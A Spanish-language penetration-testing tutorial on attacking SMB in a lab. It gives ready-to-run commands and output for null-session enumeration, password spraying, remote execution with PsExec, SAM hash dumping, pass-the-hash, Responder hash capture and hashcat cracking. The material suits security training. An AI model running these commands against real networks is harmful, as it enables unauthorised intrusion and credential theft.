Server Message Block (SMB) es un protocolo de comunicación creado para proporcionar acceso compartido a archivos e impresoras entre nodos en una red. Inicialmente, fue diseñado para ejecutarse sobre NetBIOS sobre TCP/IP (NBT) usando el puerto TCP `139` y los puertos UDP `137` y `138`. Sin embargo, con Windows 2000, Microsoft añadió la opción de ejecutar SMB directamente sobre TCP/IP en el puerto `445` sin la capa adicional de NetBIOS. Hoy en día, los sistemas operativos modernos de Windows usan SMB sobre TCP, pero aún admiten la implementación de NetBIOS como respaldo.

Samba es una implementación de código abierto del protocolo SMB basada en Unix/Linux. También permite que servidores Linux/Unix y clientes Windows usen los mismos servicios SMB.

Por ejemplo, en Windows, SMB puede ejecutarse directamente sobre el puerto 445 TCP/IP sin necesidad de NetBIOS sobre TCP/IP, pero si Windows tiene NetBIOS habilitado, o estamos atacando un host que no es Windows, encontraremos SMB ejecutándose en el puerto 139 TCP/IP. Esto significa que SMB se está ejecutando con NetBIOS sobre TCP/IP.

Otro protocolo comúnmente relacionado con SMB es [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC proporciona a un desarrollador de aplicaciones una forma genérica de ejecutar un procedimiento (también conocido como función) en un proceso local o remoto sin tener que entender los protocolos de red utilizados para soportar la comunicación, como se especifica en [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), que define un RPC sobre SMB Protocol que puede usar SMB Protocol named pipes como su transporte subyacente.

Para atacar un SMB Server, necesitamos entender su implementación, sistema operativo y qué herramientas podemos usar para abusar de él. Al igual que con otros servicios, podemos abusar de la mala configuración o de los privilegios excesivos, explotar vulnerabilidades conocidas o descubrir nuevas vulnerabilidades. Además, después de obtener acceso al servicio SMB, si interactuamos con una carpeta compartida, debemos estar conscientes del contenido en el directorio. Finalmente, si estamos atacando NetBIOS o RPC, identificar qué información podemos obtener o qué acción podemos realizar en el objetivo.

---

## Enumeration

Dependiendo de la implementación de SMB y el sistema operativo, obtendremos diferente información utilizando `Nmap`. Ten en cuenta que al atacar Windows OS, la información de la versión generalmente no se incluye como parte de los resultados del escaneo Nmap. En su lugar, Nmap intentará adivinar la versión del sistema operativo. Sin embargo, a menudo necesitaremos otros escaneos para identificar si el objetivo es vulnerable a un exploit en particular. Cubriremos la búsqueda de vulnerabilidades conocidas más adelante en esta sección. Por ahora, escaneemos los puertos 139 y 445 TCP.

```r
sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 1July-13 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

El escaneo de Nmap revela información esencial sobre el objetivo:

- Versión de SMB (Samba smbd 4.6.2)
- Nombre del host HTB
- El sistema operativo es Linux basado en la implementación de SMB

Exploremos algunas configuraciones erróneas comunes y ataques específicos de protocolos.

---

## Misconfigurations

SMB puede configurarse para no requerir autenticación, lo que a menudo se llama una `null session`. En su lugar, podemos iniciar sesión en un sistema sin nombre de usuario ni contraseña.

### Anonymous Authentication

Si encontramos un servidor SMB que no requiere nombre de usuario y contraseña o encontramos credenciales válidas, podemos obtener una lista de compartidos, nombres de usuarios, grupos, permisos, políticas, servicios, etc. La mayoría de las herramientas que interactúan con SMB permiten la conectividad de sesión nula, incluidas `smbclient`, `smbmap`, `rpcclient` o `enum4linux`. Veamos cómo podemos interactuar con compartidos de archivos y RPC usando autenticación nula.

### File Share

Usando `smbclient`, podemos mostrar una lista de los compartidos del servidor con la opción `-L`, y usando la opción `-N`, le decimos a `smbclient` que use la sesión nula.

```r
smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`smbmap` es otra herramienta que nos ayuda a enumerar compartidos de red y acceder a los permisos asociados. Una ventaja de `smbmap` es que proporciona una lista de permisos para cada carpeta compartida.

```r
smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Usando `smbmap` con la opción `-r` o `-R` (recursivo), uno puede navegar por los directorios:

```r
smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

En el ejemplo anterior, los permisos están configurados para `READ` y `WRITE`, lo cual se puede usar para subir y descargar archivos.

```r
smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```r
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Remote Procedure Call (RPC)

Podemos usar la herramienta `rpcclient` con una sesión nula para enumerar una workstation o Domain Controller.

La herramienta `rpcclient` nos ofrece muchos comandos diferentes para ejecutar funciones específicas en el servidor SMB para recopilar información o modificar atributos del servidor, como un nombre de usuario. Podemos usar este [cheat sheet de SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) o revisar la lista completa de todas estas funciones en la [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) de `rpcclient`.

```r
rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa

36]
user:[smorgan] rid:[0xa37]
```

`enum4linux` es otra utilidad que admite sesiones nulas, y utiliza `nmblookup`, `net`, `rpcclient` y `smbclient` para automatizar algunas enumeraciones comunes de objetivos SMB como:

- Nombre del Workgroup/Domain
- Información de usuarios
- Información del sistema operativo
- Información de grupos
- Carpetas compartidas
- Información de políticas de contraseñas

La [herramienta original](https://github.com/CiscoCXSecurity/enum4linux) fue escrita en Perl y [reescrita por Mark Lowe en Python](https://github.com/cddmp/enum4linux-ng).

```r
./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

---

## Protocol Specifics Attacks

Si no se habilita una sesión nula, necesitaremos credenciales para interactuar con el protocolo SMB. Dos formas comunes de obtener credenciales son [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) y [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

### Brute Forcing and Password Spray

Al usar brute-forcing, probamos tantas contraseñas como sea posible contra una cuenta, pero puede bloquear una cuenta si alcanzamos el umbral. Podemos usar brute-forcing y detenernos antes de alcanzar el umbral si lo conocemos. De lo contrario, no recomendamos usar brute force.

Password spraying es una mejor alternativa, ya que podemos atacar una lista de nombres de usuario con una contraseña común para evitar bloqueos de cuentas. Podemos intentar más de una contraseña si conocemos el umbral de bloqueo de cuenta. Típicamente, dos o tres intentos son seguros, siempre y cuando esperemos 30-60 minutos entre intentos. Exploremos la herramienta [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) que incluye la capacidad de ejecutar password spraying.

Con CrackMapExec (CME), podemos atacar múltiples IPs, usando numerosos usuarios y contraseñas. Veamos un caso de uso común para password spraying. Para realizar un password spray contra una IP, podemos usar la opción `-u` para especificar un archivo con una lista de usuarios y `-p` para especificar una contraseña. Esto intentará autenticar a cada usuario de la lista usando la contraseña proporcionada.

```r
cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```r
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Note:** Por defecto CME se cerrará después de encontrar un inicio de sesión exitoso. Usando la opción `--continue-on-success` continuará haciendo el spraying incluso después de encontrar una contraseña válida. Es muy útil para hacer spraying de una sola contraseña contra una gran lista de usuarios. Además, si estamos atacando una computadora que no está unida a un dominio, necesitaremos usar la opción `--local-auth`. Para un estudio más detallado sobre Password Spraying, consulta el módulo de Active Directory Enumeration & Attacks.

Para obtener instrucciones de uso más detalladas, consulta la [guía de documentación](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials) de la herramienta.

### SMB

Los servidores SMB de Linux y Windows proporcionan diferentes rutas de ataque. Por lo general, solo obtendremos acceso al sistema de archivos, abusar de privilegios o explotar vulnerabilidades conocidas en un entorno Linux, como discutiremos más adelante en esta sección. Sin embargo, en Windows, la superficie de ataque es mayor.

Al atacar un Windows SMB Server, nuestras acciones estarán limitadas por los privilegios que tenía el usuario que logramos comprometer. Si este usuario es un Administrador o tiene privilegios específicos, podremos realizar operaciones como:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

Discutamos cómo podemos realizar dichas operaciones. Además, aprenderemos cómo se puede abusar del protocolo SMB para recuperar el hash de un usuario como método para escalar privilegios o acceder a una red.

### Remote Code Execution (RCE)

Antes de profundizar en cómo ejecutar un comando en un sistema remoto usando SMB, hablemos de Sysinternals. El sitio web de Windows Sysinternals fue creado en 1996 por [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) y [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) para ofrecer recursos técnicos y utilidades para gestionar, diagnosticar, solucionar problemas y monitorear un entorno de Microsoft Windows. Microsoft adquirió Windows Sysinternals y sus activos el 18 de julio de 2006.

Sysinternals presentó varias herramientas freeware para administrar y monitorear computadoras con Microsoft Windows. El software ahora se puede encontrar en el [sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/). Una de esas herramientas freeware para administrar sistemas remotos es PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) es una herramienta que nos permite ejecutar procesos en otros sistemas, con total interactividad para aplicaciones de consola, sin tener que instalar manualmente el software cliente. Funciona porque tiene una imagen de servicio de Windows dentro de su ejecutable. Toma este servicio y lo despliega en el compartido admin$ (por defecto) en la máquina remota. Luego usa la interfaz DCE/RPC sobre SMB para acceder a la API del Service Control Manager de Windows. A continuación, inicia el servicio PSExec en la máquina remota. El servicio PSExec luego crea un [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) que puede enviar comandos al sistema.

Podemos descargar PsExec desde el [sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), o podemos usar algunas implementaciones en Linux:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Ejemplo de funcionalidad tipo PsExec en Python usando [RemComSvc](https://github.com/kavika13/Rem

Com).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - Un enfoque similar a PsExec sin usar [RemComSvc](https://github.com/kavika13/RemCom). La técnica se describe aquí. Esta implementación va un paso más allá, instanciando un servidor SMB local para recibir la salida de los comandos. Esto es útil cuando la máquina objetivo NO tiene un compartido escribible disponible.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - Este ejemplo ejecuta un comando en la máquina objetivo a través del servicio Task Scheduler y devuelve la salida del comando ejecutado.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - incluye una implementación de `smbexec` y `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Implementación de PsExec en Ruby.

### Impacket PsExec

Para usar `impacket-psexec`, necesitamos proporcionar el dominio/nombre de usuario, la contraseña y la dirección IP de nuestra máquina objetivo. Para obtener más información detallada, podemos usar la ayuda de impacket:

```r
impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

Para conectarse a una máquina remota con una cuenta de administrador local, usando `impacket-psexec`, podemos usar el siguiente comando:

```r
impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

Las mismas opciones se aplican a `impacket-smbexec` y `impacket-atexec`.

### CrackMapExec

Otra herramienta que podemos usar para ejecutar CMD o PowerShell es `CrackMapExec`. Una ventaja de `CrackMapExec` es la disponibilidad de ejecutar un comando en múltiples hosts al mismo tiempo. Para usarlo, necesitamos especificar el protocolo, `smb`, la dirección IP o el rango de direcciones IP, la opción `-u` para el nombre de usuario, y `-p` para la contraseña, y la opción `-x` para ejecutar comandos cmd o `-X` en mayúscula para ejecutar comandos de PowerShell.

```r
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Note:** Si la opción `--exec-method` no está definida, CrackMapExec intentará ejecutar el método atexec, si falla puedes intentar especificar la opción `--exec-method` smbexec.

### Enumerating Logged-on Users

Imaginemos que estamos en una red con múltiples máquinas. Algunas de ellas comparten la misma cuenta de administrador local. En este caso, podríamos usar `CrackMapExec` para enumerar usuarios conectados en todas las máquinas dentro de la misma red `10.10.110.17/24`, lo que acelera nuestro proceso de enumeración.

```r
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

### Extract Hashes from SAM Database

El Security Account Manager (SAM) es un archivo de base de datos que almacena las contraseñas de los usuarios. Puede usarse para autenticar usuarios locales y remotos. Si obtenemos privilegios administrativos en una máquina, podemos extraer los hashes de la base de datos SAM para diferentes propósitos:

- Autenticar como otro usuario.
- Cracking de contraseñas, si logramos descifrar la contraseña, podemos intentar reutilizarla para otros servicios o cuentas.
- Pass The Hash. Lo discutiremos más adelante en esta sección.

```r
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110

.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

### Pass-the-Hash (PtH)

Si logramos obtener un hash NTLM de un usuario, y si no podemos descifrarlo, aún podemos usar el hash para autenticarnos sobre SMB con una técnica llamada Pass-the-Hash (PtH). PtH permite a un atacante autenticarse en un servidor o servicio remoto usando el hash NTLM subyacente de la contraseña de un usuario en lugar de la contraseña en texto claro. Podemos usar un ataque PtH con cualquier herramienta `Impacket`, `SMBMap`, `CrackMapExec`, entre otras herramientas. Aquí hay un ejemplo de cómo funcionaría con `CrackMapExec`:

```r
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### Forced Authentication Attacks

También podemos abusar del protocolo SMB creando un servidor SMB falso para capturar los [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) de los usuarios.

La herramienta más común para realizar tales operaciones es `Responder`. [Responder](https://github.com/lgandx/Responder) es una herramienta poisoner de LLMNR, NBT-NS y MDNS con diferentes capacidades, una de ellas es la posibilidad de configurar servicios falsos, incluido SMB, para robar hashes NetNTLM v1/v2. En su configuración predeterminada, encontrará tráfico LLMNR y NBT-NS. Luego, responderá en nombre de los servidores que la víctima está buscando y capturará sus hashes NetNTLM.

Ilustremos un ejemplo para entender mejor cómo funciona `Responder`. Imaginemos que creamos un servidor SMB falso usando la configuración predeterminada de Responder, con el siguiente comando:

```r
responder -I <interface name>
```

Cuando un usuario o un sistema intenta realizar una Name Resolution (NR), se llevan a cabo una serie de procedimientos por una máquina para recuperar la dirección IP de un host por su nombre de host. En las máquinas Windows, el procedimiento será aproximadamente el siguiente:

- Se requiere la dirección IP del nombre del archivo compartido.
- Se verificará el archivo local del host (C:\Windows\System32\Drivers\etc\hosts) para encontrar registros adecuados.
- Si no se encuentran registros, la máquina cambia a la caché DNS local, que realiza un seguimiento de los nombres resueltos recientemente.
- ¿No hay ningún registro DNS local? Se enviará una consulta al servidor DNS que ha sido configurado.
- Si todo lo demás falla, la máquina emitirá una consulta multicast, solicitando la dirección IP del archivo compartido a otras máquinas en la red.

Supongamos que un usuario escribió incorrectamente el nombre de una carpeta compartida `\\mysharefoder\` en lugar de `\\mysharedfolder\`. En ese caso, todas las resoluciones de nombres fallarán porque el nombre no existe, y la máquina enviará una consulta multicast a todos los dispositivos en la red, incluidos nosotros ejecutando nuestro servidor SMB falso. Este es un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando tales consultas y suplantando respuestas, haciendo que la víctima crea que los servidores maliciosos son confiables. Esta confianza generalmente se usa para robar credenciales.

```r
sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash    

 : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Estas credenciales capturadas pueden ser descifradas usando [hashcat](https://hashcat.net/hashcat/) o reenviadas a un host remoto para completar la autenticación e impersonar al usuario.

Todos los hashes guardados están ubicados en el directorio de logs de Responder (`/usr/share/responder/logs/`). Podemos copiar el hash a un archivo e intentar descifrarlo usando el módulo 5600 de hashcat.

**Note:** Si notas múltiples hashes para una cuenta, esto se debe a que NTLMv2 utiliza un desafío del lado del cliente y del lado del servidor que se randomiza para cada interacción. Esto hace que los hashes resultantes que se envían estén salados con una cadena de números aleatoria. Esto es por lo que los hashes no coinciden pero aún representan la misma contraseña.

```r
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

